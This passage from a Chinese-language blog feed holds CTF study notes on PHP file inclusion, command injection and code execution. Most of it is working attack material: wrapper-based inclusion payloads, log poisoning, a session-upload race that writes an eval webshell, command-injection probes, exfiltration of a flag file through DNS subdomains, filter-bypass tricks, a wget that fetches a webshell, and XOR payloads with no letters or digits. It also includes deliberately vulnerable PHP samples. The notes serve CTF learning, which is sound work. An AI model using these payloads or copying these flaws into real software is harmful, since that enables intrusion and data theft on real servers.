    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF-文件包含</title>
    <link href="http://example.com/2021/05/23/CTF-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>http://example.com/2021/05/23/CTF-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
    <published>2021-05-23T06:46:32.000Z</published>
    <updated>2021-07-27T01:42:50.074Z</updated>
    
    <content type="html"><![CDATA[<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><h4 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php伪协议事实上就是其支持的协议与封装协议</span><br></pre></td></tr></table></figure><span id="more"></span><p>参考文档：</p><p><a href="https://www.php.net/manual/zh/wrappers.php">https://www.php.net/manual/zh/wrappers.php</a></p><p>当只允许上传zip文件</p><p>使用zip协议phar协议解压</p><p>文件包含漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">include($file.&quot;php&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>绕过方法：</p><p>新建一个test.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>使用zip进行无损压缩test.php，phpinfo.zip</p><p>利用伪协议 解压缩zip文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=zip://upload/phpinfo.zip%23phpinfo</span><br><span class="line">?file=phar://upload/phpinfo.zip/phpinfo</span><br><span class="line">phar要在php5.3后的版本使用</span><br></pre></td></tr></table></figure><p>如果后面拼接的是jpg，</p><p>解决方法，新建php文件改名为jpg，然后压缩即可。</p><h4 id="日志文件的利用"><a href="#日志文件的利用" class="headerlink" title="日志文件的利用"></a>日志文件的利用</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">无法找到包含的文件，此时可使用日志文件</span><br></pre></td></tr></table></figure><p>环境：httpd.conf文件中的配置CustomLog”logs/access.log”common</p><p>通过burp访问参数，不然会记录到日志文件后会被URL编码，导致无法当作php代码执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=&lt;?php+phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p>然后通过文件包含漏洞页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=../../../Extensions\Apache2.4.39\logs/access.log</span><br></pre></td></tr></table></figure><h4 id="session会话利用"><a href="#session会话利用" class="headerlink" title="session会话利用"></a>session会话利用</h4><p>关键点：</p><p>php7.2之后，提供了如果提交表单数据具有PHP_SESSION_UPLOAD_PROGRESS=上传后具体session名称 和file=@具体文件路径，此时可保存指定session名称的会话文件。</p><p>session_upload_progress.enabled开启</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl ...../test.php -H &quot;Cookie:PHPSESSID=abc&quot; -F &quot;PHP_SESSION_UPLOAD_PROGRESS=&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;);?&gt;&quot; -F &quot;file=@/etc/passwd&quot;</span><br></pre></td></tr></table></figure><p>加代理，使用burp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -x 127.0.0.1:8090...</span><br></pre></td></tr></table></figure><p>由于session_upload_progress.cleaned开启，需要竞争上传。</p><p>最终要不断访问的文件名为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sess_abc</span><br></pre></td></tr></table></figure><p>直到生成shell.php。</p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;文件包含&quot;&gt;&lt;a href=&quot;#文件包含&quot; class=&quot;headerlink&quot; title=&quot;文件包含&quot;&gt;&lt;/a&gt;文件包含&lt;/h3&gt;&lt;h4 id=&quot;伪协议&quot;&gt;&lt;a href=&quot;#伪协议&quot; class=&quot;headerlink&quot; title=&quot;伪协议&quot;&gt;&lt;/a&gt;伪协议&lt;/h4&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;php伪协议事实上就是其支持的协议与封装协议&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF-命令执行</title>
    <link href="http://example.com/2021/05/23/CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>http://example.com/2021/05/23/CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2021-05-23T05:56:41.000Z</published>
    <updated>2021-07-27T01:44:04.123Z</updated>
    
    <content type="html"><![CDATA[<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>简单介绍</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户通过浏览器提交执行命令，由于服务器没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许使用者从$PATH或程序执行环境的其他方面来执行一个恶意构造的代码</span><br></pre></td></tr></table></figure><span id="more"></span><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">命令执行与代码执行区别：</span><br><span class="line">1、命令执行漏洞：直接调用操作系统命令</span><br><span class="line">直接</span><br><span class="line">2、代码执行漏洞：靠执行脚本代码调用操作系统命令</span><br><span class="line">间接</span><br></pre></td></tr></table></figure><p>命令执行函数</p><p>了解相关函数</p><p>参考文档</p><p><a href="https://www.php.net/manual/zh/ref.exec.php">https://www.php.net/manual/zh/ref.exec.php</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">system函数</span><br><span class="line">exec函数</span><br><span class="line">shell_exec函数</span><br><span class="line">passthru函数 可以直接执行并输出结果</span><br><span class="line">``反引号与shell_exec函数类似。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="命令执行分类"><a href="#命令执行分类" class="headerlink" title="命令执行分类"></a>命令执行分类</h4><p>根据有无输出结果，有无回显分类</p><p>判断是否存在命令执行姿势</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、根据页面响应延时</span><br><span class="line">2、发送http请求，http服务端显示请求</span><br><span class="line">3、发送dns请求，dns服务端显示请求</span><br></pre></td></tr></table></figure><p><strong>延时执行</strong></p><p>在shell命令中，具有sleep命令可完成延时执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -alh |sleep 3</span><br><span class="line">-alh显示所有文件，有利于我们观察，管道符(分隔符也可以，分别执行)，前面输出结果作为后面的输入。</span><br></pre></td></tr></table></figure><p>利用于无回显漏洞代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">shell_exec($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line">此命令不会将结果输出，我们通过延时执行判断是否存在命令执行。</span><br></pre></td></tr></table></figure><p><strong>http请求端口监听</strong></p><p>服务端设置监听80端口，等待连接，输出相应</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 80</span><br><span class="line">或</span><br><span class="line">python -m SimpleHTTPServer -p 80</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl 服务端ip地址:80</span><br><span class="line">通过curl进行连接</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">shell_exec($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line">访问</span><br><span class="line">?cmd=curl ip:80</span><br><span class="line">若出现请求则存在命令执行漏洞。</span><br></pre></td></tr></table></figure><p><strong>dns请求</strong></p><p>网站</p><p><a href="http://dnslog.cn/">http://dnslog.cn/</a></p><p>或</p><p><a href="http://ceye.io/">http://ceye.io/</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">访问</span><br><span class="line">?cmd=ping -c 3 xxx.dnslog.cn</span><br><span class="line">-c 设置ping次数</span><br></pre></td></tr></table></figure><p><strong>dnslog利用命令执行</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(flag.txt)</span><br><span class="line">$cmd=&#x27;ping -c 3.GET[&#x27;a&#x27;];&#x27;</span><br><span class="line">echo $cmd;</span><br><span class="line">$out=shell_exec($cmd);</span><br><span class="line">?&gt;</span><br><span class="line">由于无回显，不能直接cat读取文件内容，</span><br><span class="line">权限较高时，可以进行本地读取：</span><br><span class="line">?a=;copy flag.txt flag.txt</span><br><span class="line">然后直接访问flag.txt</span><br><span class="line"></span><br><span class="line">方法二dns请求读取</span><br><span class="line"></span><br><span class="line">去掉文本中的空格，然后把内容拼接到域名</span><br><span class="line">sed s/空格/没有任何内容/替换文本内容为空，[[:space:]]表示代码中的空格</span><br><span class="line">?a=`cat flag.txt|sed s/[[:space:]]//g.+子域名` g参数表示全局</span><br><span class="line">域名只能出现数字、下划线、横杠、字母，如果ping命令不支持特殊符号，我们需要进行替换</span><br><span class="line">?a=`cat flag.txt|sed s/[[:space:]]//g|tr &quot;&lt;|?|$|&#123;|&#125;|&#x27;|;|=&gt;&quot; &quot;0&quot;`.+子域名</span><br><span class="line">替换为0</span><br><span class="line">?a=`cat flag.txt|sed s/[[:space:]]//g|tr &quot;&lt;|?|$|&#123;|&#125;|&#x27;|;|=&gt;&quot; &quot;1&quot;`.+子域名</span><br><span class="line">替换为1，对比猜出flag。</span><br></pre></td></tr></table></figure><h4 id="命令执行技巧"><a href="#命令执行技巧" class="headerlink" title="命令执行技巧"></a>命令执行技巧</h4><p>利用linux shell中特性</p><p><strong>linux shell分隔符</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%0a </span><br><span class="line">%0d</span><br><span class="line">;</span><br><span class="line">|</span><br><span class="line">||前面错了，才会执行后面的。</span><br><span class="line">&amp;&amp;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=$_GET[&#x27;a&#x27;];</span><br><span class="line">$b=shell_exec(&#x27;echo &#x27;.$a);</span><br><span class="line">echo $b;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">传入</span><br><span class="line">?a=abc%0d`whoami`记得反引号</span><br><span class="line">?a=abc;whoami</span><br></pre></td></tr></table></figure><p><strong>linux shell空格</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%09</span><br><span class="line">$IFS$9</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS</span><br></pre></td></tr></table></figure><h4 id="常见绕过技巧"><a href="#常见绕过技巧" class="headerlink" title="常见绕过技巧"></a>常见绕过技巧</h4><p><strong>1、重定义变量 绕过命令过滤</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;a=l;b=s;$a$b</span><br><span class="line">ls</span><br></pre></td></tr></table></figure><p><strong>2、base64编码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`echo base64编码| base64 -d`</span><br></pre></td></tr></table></figure><h4 id="长度限制命令执行"><a href="#长度限制命令执行" class="headerlink" title="长度限制命令执行"></a>长度限制命令执行</h4><p>无长度限制，可上传webshell，下载webshell，并重命名为x.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">$output=shell_exec($cmd);</span><br><span class="line">echo $output;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>当前用户对该目录具有读写权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1、执行命令</span><br><span class="line">wget ip/a mv a a.php</span><br><span class="line"></span><br><span class="line">2、直接写入webshell</span><br><span class="line">执行命令</span><br><span class="line">echo &lt;?php &quot;eval($_POST[1];)&quot; &gt; a.php</span><br></pre></td></tr></table></figure><p>存在长度限制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">使用w&gt;重定向，拼接,倒序执行，其中\是长命令分隔，可将一条命令在多行执行，这里没有使用到。</span><br><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br><span class="line">w&gt;&#x27;?&gt;&#x27;</span><br><span class="line">W&gt;&#x27;($_POST[]);&#x27;</span><br><span class="line">W&gt;&#x27;eval&#x27;</span><br><span class="line">w&gt;&#x27;&lt;?php&#x27;</span><br><span class="line">ls -t &gt;1.php</span><br></pre></td></tr></table></figure><h4 id="无数字字母的执行"><a href="#无数字字母的执行" class="headerlink" title="无数字字母的执行"></a>无数字字母的执行</h4><p>php生成异或代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=&#x27;~@#$%^&amp;*()_+/?.,&lt;&gt;-=&#123;&#125;[]|&#x27;;</span><br><span class="line">for($i=0;$i&lt;strlen($a);$i++)</span><br><span class="line">for($j=0;$j&lt;strlen($a);$j++)&#123;</span><br><span class="line">if(ord($a[$i]^$a[$j])&gt;64 &amp;&amp; ord($a[$i]^$a[$j])&lt;91)&#123;</span><br><span class="line">echo $a[$i].&#x27;  xor  &#x27;.$a[$j].&#x27;  is  &#x27;;</span><br><span class="line">echo chr(ord($a[$i]^$a[$j])).&#x27; &#x27;;</span><br><span class="line">echo ord( $a[$i]^$a[$j]);</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else  if(ord($a[$i]^$a[$j])&gt;96 &amp;&amp; ord($a[$i]^$a[$j])&lt;122)&#123;</span><br><span class="line">echo $a[$i].&#x27;  xor  &#x27;.$a[$j].&#x27;  is  &#x27;;</span><br><span class="line">echo chr(ord($a[$i]^$a[$j])).&#x27; &#x27;;</span><br><span class="line">echo ord($a[$i]^$a[$j]);</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function getFlag()&#123;</span><br><span class="line">echo flag&#123;&#x27;xxx&#x27;&#125;;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class="line">$code=$_GET[&#x27;code&#x27;];</span><br><span class="line">if(preg_match(&quot;/[A-Za-z0-9]+/&quot;($code))&#123;</span><br><span class="line">die(&quot;no&quot;);</span><br><span class="line">&#125;</span><br><span class="line">echo $code;</span><br><span class="line">eval($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">highlight_file(__FILE__)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=$_=&#x27;&lt;&gt;&#123;=@^[&#x27;  ^ &#x27;[[/&#123;,?&lt;&#x27;;$_();</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;命令执行&quot;&gt;&lt;a href=&quot;#命令执行&quot; class=&quot;headerlink&quot; title=&quot;命令执行&quot;&gt;&lt;/a&gt;命令执行&lt;/h3&gt;&lt;p&gt;简单介绍&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;用户通过浏览器提交执行命令，由于服务器没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许使用者从$PATH或程序执行环境的其他方面来执行一个恶意构造的代码&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF-代码执行</title>
    <link href="http://example.com/2021/05/21/CTF-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    <id>http://example.com/2021/05/21/CTF-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</id>
    <published>2021-05-21T05:54:00.000Z</published>
    <updated>2021-07-27T01:43:06.586Z</updated>
    
    <content type="html"><![CDATA[<h2 id="代码执行介绍"><a href="#代码执行介绍" class="headerlink" title="代码执行介绍"></a>代码执行介绍</h2><p>五类相关函数</p><p>1、eval+assert函数</p><p>2、preg_replace/e最新php不支持，php5广泛使用</p><p>3、用户自定义函数</p><p>4、动态函数</p><p>5、其他</p><span id="more"></span><p>1、</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">eval(php4 php5 php7)--把字符串作为php代码执行，当用户可以控制字符串内容，那么此时存在代码注入漏洞。</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">eval(&#x27;phpinfo;&#x27;);</span><br><span class="line">?&gt;</span><br><span class="line">eval执行的代码必须加分号，不然会报错。</span><br><span class="line">assert类似，但是兼容性更强，字符串中可不加分号，但是php7.1以上已经废弃assert</span><br></pre></td></tr></table></figure><p>安全人员防御：加引号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">eval(&quot;\$ret=strtolower(&#x27;$cmd&#x27;);&quot;)//将字符串转为小写，反斜杠转义$,为了不当做变量处理</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>绕过姿势：</p><p>闭合+注释</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;);phpinfo();//注释掉后面的内容</span><br><span class="line">传入变成</span><br><span class="line">$ret=strtolower(&#x27;&#x27;);phpinfo();//</span><br></pre></td></tr></table></figure><p>如果安全人员开启了GPC将无法绕过</p><p>因为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;会变成\&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在php5之前，magic_quotes_gpc默认开启，但是在php的cookies中，如果有单引号将会被反斜杠转义，现在差不多淘汰，一般使用stripslashes函数转义</span><br><span class="line">传入1&#x27;直接变成\&#x27;</span><br></pre></td></tr></table></figure><p>2、</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">preg_place</span><br><span class="line">存在危险修饰符/e</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">preg_place(&quot;/abc/e&quot;,$_REQUEST[&#x27;cmd&#x27;],&quot;abc&quot;)</span><br><span class="line">?&gt;</span><br><span class="line">这里匹配到了abc可直接执行传入的内容。</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">preg_place(&#x27;/&lt;data&gt;(.*)&lt;\/data&gt;/e&#x27;,&#x27;$ret=&quot;\\1&quot;;&#x27;,$cmd)//反斜杠转义/，说明是字符串的内容。</span><br><span class="line">echo $ret;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">传入</span><br><span class="line">?cmd=&lt;data&gt;&#123;$&#123;phpinfo()&#125;&#125;&lt;/data&gt;</span><br></pre></td></tr></table></figure><p>3、自定义函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">create_function主要用来创建匿名函数，如果没有严格对参数传递进行过滤，攻击者可构造特殊字符串传递给该函数执行任意命令。</span><br><span class="line">&lt;?php</span><br><span class="line">$func=create_function(&#x27;&#x27;,$_REQUEST[&#x27;cmd&#x27;]);</span><br><span class="line">$func();</span><br><span class="line">?&gt;</span><br><span class="line">第一个为参数，第二个为代码。</span><br></pre></td></tr></table></figure><p>4、动态函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function a()&#123;</span><br><span class="line">echo &#x27;a&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&quot;func&quot;]))&#123;</span><br><span class="line">$myfunc=$_GET[&quot;func&quot;]</span><br><span class="line">$myfunc();</span><br><span class="line">&#125;</span><br><span class="line">传入?func=phpinfo</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$_GET[&#x27;a&#x27;]($_GET[&#x27;b&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line">传入</span><br><span class="line">?a=assert&amp;b=phpinfo()</span><br></pre></td></tr></table></figure><p>用户自定义函数回调</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(&#x27;assert&#x27;,$_GET[&#x27;cmd&#x27;]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用is_callable函数来确定某函数是否可回调</span><br><span class="line">输出1表示可，没输出不可。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">传递数组类型</span><br><span class="line">&lt;?php</span><br><span class="line">$cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">$arrar[0]=$cmd;</span><br><span class="line">call_user_func_array(&#x27;assert&#x27;,$array);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">如果代码没有转为数组，我们可以直接传入数组</span><br><span class="line"></span><br><span class="line">?cmd[]=phpinfo()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">$array1=array($cmd);</span><br><span class="line">$func=$_GET[&#x27;func&#x27;];</span><br><span class="line">array_filter($array,$func)</span><br><span class="line">?&gt;</span><br><span class="line">这个函数不同于上面，这里参数在前，函数在后。</span><br><span class="line"></span><br><span class="line">php5.6以上</span><br><span class="line">sort</span><br><span class="line">usort($_GET)</span><br><span class="line"></span><br><span class="line">?1[]=phpinfo()&amp;1[]=123&amp;2=assert()</span><br></pre></td></tr></table></figure><p>5、其他</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$&#123;php代码&#125;</span><br><span class="line">&lt;?php</span><br><span class="line">$&#123;php代码&#125;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line">$func=$&#123;phpinfo()&#125;;</span><br><span class="line">$func();</span><br></pre></td></tr></table></figure>]]></content>
    
    
